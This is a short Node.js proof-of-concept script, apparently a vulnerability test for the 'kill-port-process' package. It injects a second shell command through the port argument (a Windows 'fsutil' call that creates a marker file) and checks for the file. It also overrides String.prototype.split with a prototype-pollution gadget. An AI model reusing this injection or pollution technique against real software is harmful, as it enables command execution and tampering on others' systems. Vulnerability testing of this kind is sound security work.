var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
const killPortProcess = require('kill-port-process');
const fs = require('fs');
const path = './kill-port-process';
const PORT = '& fsutil file createnew kill-port-process 0 &';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(killPortProcess(PORT).then(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
}).catch(err => {
}).finally(() => {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
}));